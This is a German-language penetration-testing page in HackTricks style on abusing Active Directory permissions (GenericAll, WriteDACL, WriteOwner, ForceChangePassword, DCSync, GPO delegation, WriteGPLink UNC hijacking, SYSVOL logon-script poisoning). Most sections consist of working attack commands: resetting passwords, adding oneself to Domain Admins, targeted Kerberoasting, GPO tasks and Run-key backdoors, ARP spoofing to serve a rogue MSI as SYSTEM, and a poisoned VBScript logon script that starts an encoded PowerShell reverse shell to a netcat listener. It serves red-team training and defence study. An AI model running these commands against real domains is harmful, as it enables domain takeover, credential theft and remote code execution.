# Abusing Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**Diese Seite ist hauptsächlich eine Zusammenfassung der Techniken aus** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **und** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Für weitere Details siehe die Originalartikel.**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll Rights on User**

Dieses Privileg gibt einem Angreifer die vollständige Kontrolle über ein Ziel-Benutzerkonto. Sobald `GenericAll`-Rechte mit dem `Get-ObjectAcl`-Befehl bestätigt wurden, kann ein Angreifer:

- **Das Passwort des Ziels ändern**: Mit `net user <username> <password> /domain` kann der Angreifer das Passwort des Benutzers zurücksetzen.
- Von Linux aus kannst du dasselbe über SAMR mit Samba `net rpc` tun:
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **Wenn das Konto deaktiviert ist, entferne das UAC-Flag**: `GenericAll` erlaubt das Bearbeiten von `userAccountControl`. Unter Linux kann BloodyAD das `ACCOUNTDISABLE`-Flag entfernen:
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting**: Weise dem Konto des Benutzers einen SPN zu, um es kerberoastbar zu machen, und verwende dann Rubeus und targetedKerberoast.py, um die Ticket-Granting-Ticket-(TGT)-Hashes zu extrahieren und zu cracken.
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: Deaktiviere die Pre-Authentifizierung für den Benutzer, wodurch sein Konto für ASREPRoasting anfällig wird.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link**: Mit `GenericAll` auf einem Benutzer kannst du einen zertifikatsbasierten Credential hinzufügen und dich als dieser authentifizieren, ohne sein Passwort zu ändern. Siehe:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **GenericAll Rights on Group**

Dieses Privileg erlaubt es einem Angreifer, Gruppenmitgliedschaften zu manipulieren, wenn er `GenericAll`-Rechte auf einer Gruppe wie `Domain Admins` hat. Nachdem der distinguished name der Gruppe mit `Get-NetGroup` identifiziert wurde, kann der Angreifer:

- **Sich selbst zur Domain Admins Group hinzufügen**: Dies kann über direkte Befehle oder mit Modulen wie Active Directory oder PowerSploit erfolgen.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Von Linux aus kannst du auch BloodyAD nutzen, um dich selbst zu beliebigen Gruppen hinzuzufügen, wenn du GenericAll/Write membership über sie hast. Wenn die Zielgruppe in „Remote Management Users“ verschachtelt ist, erhältst du sofort WinRM-Zugriff auf Hosts, die diese Gruppe berücksichtigen:
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

Wenn du diese Privilegien auf einem computer object oder einem user account hast, ermöglicht das:

- **Kerberos Resource-based Constrained Delegation**: Ermöglicht das Übernehmen eines computer object.
- **Shadow Credentials**: Nutze diese technique, um ein computer- oder user account zu impersonieren, indem die Privilegien zum Erstellen von shadow credentials ausgenutzt werden.

## **WriteProperty on Group**

Wenn ein user `WriteProperty`-Rechte auf alle objects für eine bestimmte group hat (z. B. `Domain Admins`), kann er:

- **Add Themselves to the Domain Admins Group**: Erreichbar durch die Kombination der Befehle `net user` und `Add-NetGroupUser`; diese Methode ermöglicht privilege escalation innerhalb der domain.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) auf Group**

Dieses Privileg ermöglicht Angreifern, sich selbst zu bestimmten Gruppen hinzuzufügen, wie etwa `Domain Admins`, über Befehle, die die Gruppenmitgliedschaft direkt manipulieren. Die folgende Befehlssequenz erlaubt das Hinzufügen von sich selbst:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Eine ähnliche Privilegierung, dies erlaubt Angreifern, sich direkt zu Gruppen hinzuzufügen, indem sie Gruppeneigenschaften ändern, wenn sie das `WriteProperty`-Recht auf diesen Gruppen haben. Die Bestätigung und Ausführung dieser Privilegierung erfolgen mit:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Das Besitzen des `ExtendedRight` auf einem Benutzer für `User-Force-Change-Password` ermöglicht das Zurücksetzen von Passwörtern, ohne das aktuelle Passwort zu kennen. Die Überprüfung dieses Rechts und dessen Ausnutzung kann über PowerShell oder alternative Command-Line-Tools erfolgen und bietet mehrere Methoden zum Zurücksetzen des Passworts eines Benutzers, einschließlich interaktiver Sessions und One-Linern für nicht-interaktive Umgebungen. Die Commands reichen von einfachen PowerShell-Aufrufen bis zur Verwendung von `rpcclient` unter Linux und zeigen die Vielseitigkeit der Angriffspfade.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner on Group**

Wenn ein Angreifer feststellt, dass er über `WriteOwner`-Rechte für eine Gruppe verfügt, kann er den Besitz der Gruppe auf sich selbst ändern. Das ist besonders wirkungsvoll, wenn es sich bei der Gruppe um `Domain Admins` handelt, da eine Änderung des Besitzers eine umfassendere Kontrolle über Gruppenattribute und Mitgliedschaft ermöglicht. Der Prozess umfasst das Identifizieren des richtigen Objekts mittels `Get-ObjectAcl` und anschließend die Verwendung von `Set-DomainObjectOwner`, um den Besitzer zu ändern, entweder per SID oder Name.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite auf User**

Diese Berechtigung erlaubt es einem Angreifer, User-Eigenschaften zu ändern. Genauer gesagt kann der Angreifer mit `GenericWrite`-Zugriff den Logon-Script-Pfad eines Users ändern, um beim User-Login ein bösartiges Script auszuführen. Dies wird erreicht, indem der Befehl `Set-ADObject` verwendet wird, um die `scriptpath`-Property des Ziel-Users auf das Script des Angreifers zu setzen.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite auf Group**

Mit diesem Privileg können Angreifer die Gruppenmitgliedschaft manipulieren, etwa indem sie sich selbst oder andere Benutzer zu bestimmten Gruppen hinzufügen. Dieser Prozess umfasst das Erstellen eines Credential-Objekts, dessen Verwendung zum Hinzufügen oder Entfernen von Benutzern aus einer Gruppe und das Überprüfen der Mitgliedschaftsänderungen mit PowerShell-Befehlen.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- Von Linux aus kann Samba `net` Mitglieder hinzufügen/entfernen, wenn du `GenericWrite` auf der Gruppe hast (nützlich, wenn PowerShell/RSAT nicht verfügbar sind):
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

Das Besitzen eines AD-Objekts und `WriteDACL`-Berechtigungen darauf ermöglicht es einem Angreifer, sich selbst `GenericAll`-Berechtigungen für das Objekt zu gewähren. Dies wird durch ADSI-Manipulation erreicht und erlaubt die vollständige Kontrolle über das Objekt sowie die Möglichkeit, seine Gruppenmitgliedschaften zu ändern. Trotzdem gibt es Einschränkungen, wenn man versucht, diese Berechtigungen mit den `Set-Acl` / `Get-Acl` cmdlets des Active Directory module auszunutzen.
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### WriteDACL/WriteOwner quick takeover (PowerView)

Wenn du `WriteOwner` und `WriteDacl` über einen User oder Service Account hast, kannst du die vollständige Kontrolle übernehmen und das Passwort mit PowerView zurücksetzen, ohne das alte Passwort zu kennen:
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
Hinweise:
- Möglicherweise müssen Sie zuerst den Eigentümer auf sich selbst ändern, wenn Sie nur `WriteOwner` haben:
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- Prüfe den Zugriff mit jedem Protokoll (SMB/LDAP/RDP/WinRM) nach dem Zurücksetzen des Passworts.

## **Replication on the Domain (DCSync)**

Der DCSync-Angriff nutzt bestimmte Replikationsberechtigungen auf der Domain, um einen Domain Controller zu imitieren und Daten zu synchronisieren, einschließlich Benutzeranmeldedaten. Diese leistungsstarke Technik erfordert Berechtigungen wie `DS-Replication-Get-Changes`, wodurch Angreifer sensible Informationen aus der AD-Umgebung extrahieren können, ohne direkten Zugriff auf einen Domain Controller zu haben. [**Erfahre hier mehr über den DCSync-Angriff.**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegation

Delegierter Zugriff zur Verwaltung von Group Policy Objects (GPOs) kann erhebliche Sicherheitsrisiken mit sich bringen. Wenn beispielsweise einem Benutzer wie `offense\spotless` GPO-Verwaltungsrechte delegiert werden, kann er Berechtigungen wie **WriteProperty**, **WriteDacl** und **WriteOwner** haben. Diese Berechtigungen können für böswillige Zwecke missbraucht werden, wie mit PowerView ermittelt wurde: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### GPO-Berechtigungen aufzählen

Um fehlerhaft konfigurierte GPOs zu identifizieren, können die Cmdlets von PowerSploit miteinander verkettet werden. Dadurch lassen sich GPOs entdecken, die ein bestimmter Benutzer verwalten darf: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Computer mit angewendeter bestimmter Richtlinie**: Es ist möglich herauszufinden, auf welche Computer eine bestimmte GPO angewendet wird, um den möglichen Umfang der Auswirkungen zu verstehen. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Auf einen bestimmten Computer angewendete Richtlinien**: Um zu sehen, welche Richtlinien auf einen bestimmten Computer angewendet werden, können Befehle wie `Get-DomainGPO` verwendet werden.

**OUs mit angewendeter bestimmter Richtlinie**: Das Identifizieren von organisatorischen Einheiten (OUs), die von einer bestimmten Richtlinie betroffen sind, kann mit `Get-DomainOU` erfolgen.

Du kannst auch das Tool [**GPOHound**](https://github.com/cogiceo/GPOHound) verwenden, um GPOs aufzuzählen und Probleme darin zu finden.

### Abuse GPO - New-GPOImmediateTask

Fehlerhaft konfigurierte GPOs können ausgenutzt werden, um Code auszuführen, zum Beispiel durch das Erstellen einer unmittelbaren geplanten Aufgabe. Dies kann genutzt werden, um einen Benutzer zur lokalen Administratorengruppe auf betroffenen Maschinen hinzuzufügen und so die Privilegien deutlich zu erhöhen:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

Das GroupPolicy-Modul ermöglicht, falls installiert, das Erstellen und Verknüpfen neuer GPOs sowie das Setzen von Einstellungen wie Registry-Werten, um Backdoors auf betroffenen Computern auszuführen. Diese Methode erfordert, dass die GPO aktualisiert wird und sich ein Benutzer am Computer anmeldet, damit die Ausführung erfolgt:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - GPO missbrauchen

SharpGPOAbuse bietet eine Methode, um bestehende GPOs zu missbrauchen, indem Tasks hinzugefügt oder Einstellungen geändert werden, ohne neue GPOs erstellen zu müssen. Dieses Tool erfordert die Modifikation bestehender GPOs oder die Verwendung von RSAT-Tools, um neue zu erstellen, bevor Änderungen angewendet werden:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Force Policy Update

GPO-Updates erfolgen typischerweise etwa alle 90 Minuten. Um diesen Prozess zu beschleunigen, insbesondere nach einer Änderung, kann der Befehl `gpupdate /force` auf dem Zielcomputer verwendet werden, um ein sofortiges Policy-Update zu erzwingen. Dieser Befehl stellt sicher, dass alle Änderungen an GPOs angewendet werden, ohne auf den nächsten automatischen Update-Zyklus zu warten.

### Under the Hood

Bei der Überprüfung der Scheduled Tasks für ein bestimmtes GPO, wie etwa `Misconfigured Policy`, kann das Hinzufügen von Tasks wie `evilTask` bestätigt werden. Diese Tasks werden durch Skripte oder command-line tools erstellt, die darauf abzielen, das Systemverhalten zu ändern oder Privilegien zu eskalieren.

Die Struktur des Tasks, wie in der von `New-GPOImmediateTask` erzeugten XML configuration file dargestellt, beschreibt die Einzelheiten des Scheduled Tasks - einschließlich des auszuführenden Befehls und seiner Trigger. Diese Datei zeigt, wie Scheduled Tasks innerhalb von GPOs definiert und verwaltet werden, und bietet eine Methode zur Ausführung beliebiger Befehle oder Skripte im Rahmen der Policy enforcement.

### Users and Groups

GPOs ermöglichen außerdem die Manipulation von User- und Group-Mitgliedschaften auf Zielsystemen. Durch direktes Bearbeiten der Users and Groups policy files können Angreifer User zu privilegierten Groups hinzufügen, wie etwa zur lokalen `administrators` group. Dies ist durch die Delegation von GPO management permissions möglich, die die Änderung von policy files erlaubt, um neue User hinzuzufügen oder Group-Mitgliedschaften zu ändern.

Die XML configuration file für Users and Groups beschreibt, wie diese Änderungen umgesetzt werden. Durch das Hinzufügen von Einträgen zu dieser Datei können bestimmten Usern erhöhte Privilegien auf den betroffenen Systemen gewährt werden. Diese Methode bietet einen direkten Ansatz zur privilege escalation durch GPO-Manipulation.

Darüber hinaus können auch weitere Methoden zur Ausführung von Code oder zur Aufrechterhaltung von persistence in Betracht gezogen werden, etwa die Nutzung von logon/logoff scripts, das Ändern von registry keys für autoruns, die Installation von Software über .msi files oder das Bearbeiten von service configurations. Diese Techniken bieten verschiedene Möglichkeiten, Zugriff aufrechtzuerhalten und Zielsysteme durch den abuse von GPOs zu kontrollieren.

### WriteGPLink + UNC path hijacking (ARP spoofing)

`WriteGPLink` über eine OU/domain erlaubt es, das `gPLink`-Attribut des Ziel-Containers zu ändern und **eine bestehende GPO zum Anwenden zu zwingen**, ohne die GPO selbst zu bearbeiten. Das wird interessant, wenn die verknüpfte GPO bereits Remote Content über **UNC paths** (`\\HOST\share\...`) referenziert, weil authentifizierte User **SYSVOL** lesen und offline nach wiederverwendbaren Policies suchen können.

High-level workflow:

1. Nutze BloodHound, um einen Principal mit `WriteGPLink` über eine OU zu identifizieren, und ermittle die Computer/User innerhalb dieser OU.
2. Klone `SYSVOL` read-only und parse GPOs auf der Suche nach **Software Installation**, **drive mappings** (`Drives.xml`) und **logon/startup scripts**, die UNC paths referenzieren.
3. Bevorzuge Policies, die auf einen **direkten Hostname** zeigen (zum Beispiel `\\DC02\share\pkg.msi`) statt DFS/domain-namespace paths, da hostname-basierte paths sich mit L2 spoofing leichter umleiten lassen.
4. Hänge den ausgewählten GPO GUID an das `gPLink` der Ziel-OU an, sodass das Opfer diese bereits vorhandene Policy verarbeitet.
5. Im selben broadcast domain ARP-spoof den UNC-Host und binde seine IP lokal (`ip addr add <target_ip>/32 dev <iface>`) ein, damit der SMB traffic des Opfers deinen Host erreicht.
6. Stelle den erwarteten path/Filename über einen attacker SMB server (zum Beispiel `smbserver.py`) bereit und warte auf die normale Policy-Verarbeitung.

Beispiel für `SYSVOL`-Sammlung und GPO-Korrelation:
```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```
Das vorhandene GPO mit der Ziel-OU verknüpfen:
```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
--gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```
#### Software Installation UNC hijack -> SYSTEM

Wenn das verknüpfte GPO ein MSI von einem UNC-Pfad bereitstellt, holt der Client es während des **Computer-Starts** ab und installiert es als **`NT AUTHORITY\SYSTEM`**. Indem du den referenzierten Host spoofst und ein bösartiges MSI unter **dem gleichen Share/Pfad/Namen** auslieferst, kannst du `WriteGPLink` in SYSTEM-Codeausführung verwandeln **ohne SYSVOL zu ändern**.

Wichtige Einschränkungen:

- **Timing ist entscheidend**: Der neue Link wird beim Policy-Refresh gesehen (häufig nach ~90 Minuten), aber **Software Installation** wird normalerweise erst beim **Neustart** ausgelöst.
- Windows Installer verfolgt die Bereitstellung häufig anhand des **`ProductCode`** des Pakets. Wenn das Produkt bereits installiert ist, kann die Bereitstellung übersprungen werden.
- Um eine Ablehnung durch den Installer zu vermeiden, patch das Rogue-MSI so, dass **`ProductCode`** und **`PackageCode`** mit dem legitimen Paket übereinstimmen, das vom GPO erwartet wird.
- Alte `.aas`-Advertisement-Dateien können in `SYSVOL` verbleiben, also prüfe, ob die Bereitstellung noch aktiv aussieht, bevor du dich darauf verlässt.
```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```
#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

GPP drive mappings in `Drives.xml` veranlassen Benutzer, sich beim Anmelden oder bei der Wiederverbindung beim konfigurierten UNC path zu authentifizieren. Wenn du den referenzierten Host spoofst, kannst du **NetNTLMv2** abfangen. Wenn SMB absichtlich fehlschlagen gelassen wird, kann Windows über **WebDAV** erneut versuchen und dabei **NTLM over HTTP** senden, was für Relays zu **LDAP(S)**, **AD CS** oder **SMB** deutlich flexibler ist.

#### Logon/startup script UNC hijack

Dasselbe Muster gilt für UNC-gehostete Scripts, die in `SYSVOL` entdeckt werden:

- **Logon scripts** werden normalerweise im **user**-Kontext ausgeführt.
- **Startup scripts** werden normalerweise im **computer / SYSTEM**-Kontext ausgeführt.

Wenn der Script path auf einen spoofarbaren Hostnamen zeigt, leite den UNC host um und liefere ersetzenden Script content vom erwarteten Speicherort.

## SYSVOL/NETLOGON Logon Script Poisoning

Beschreibbare Pfade unter `\\<dc>\SYSVOL\<domain>\scripts\` oder `\\<dc>\NETLOGON\` erlauben Manipulationen an Logon scripts, die per GPO bei der Benutzeranmeldung ausgeführt werden. Das ermöglicht code execution im security context der sich anmeldenden Benutzer.

### Locate logon scripts
- Untersuche Benutzerattribute auf ein konfiguriertes Logon script:
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- Domain-Freigaben durchsuchen, um Verknüpfungen oder Verweise auf Skripte aufzudecken:
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- Analysiere `.lnk`-Dateien, um Ziele aufzulösen, die auf SYSVOL/NETLOGON verweisen (nützlicher DFIR-Trick und für Angreifer ohne direkten GPO-Zugriff):
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- BloodHound zeigt das `logonScript`-Attribut (scriptPath) auf Benutzerknoten an, wenn es vorhanden ist.

### Schreibzugriff validieren (Share-Listings nicht vertrauen)
Automatisierte Tools können SYSVOL/NETLOGON als schreibgeschützt anzeigen, aber die zugrunde liegenden NTFS-ACLs können trotzdem Schreibzugriff erlauben. Immer testen:
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
Wenn sich die Dateigröße oder mtime ändert, hast du write. Originale vor Änderungen bewahren.

### Poison a VBScript logon script für RCE
Füge einen Befehl hinzu, der eine PowerShell reverse shell startet (generiere sie von revshells.com), und behalte die ursprüngliche Logik bei, um die Geschäftsfunktion nicht zu beeinträchtigen:
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
Höre auf deinem Host zu und warte auf die nächste interaktive Anmeldung:
```bash
rlwrap -cAr nc -lnvp 443
```
Hinweise:
- Die Ausführung erfolgt unter dem Token des Logging-Benutzers (nicht SYSTEM). Der Umfang ist der GPO-Link (OU, site, domain), der dieses Script anwendet.
- Aufräumen durch Wiederherstellen des ursprünglichen Inhalts/der Zeitstempel nach der Nutzung.


## References

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [BloodyAD – AD attribute/UAC operations from Linux](https://github.com/CravateRouge/bloodyAD)
- [Samba – net rpc (group membership)](https://www.samba.org/)
- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [TrustedSec - ARP Around and Find Out: Hijacking GPO UNC Paths for Code Execution and NTLM Relay](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)

{{#include ../../../banners/hacktricks-training.md}}
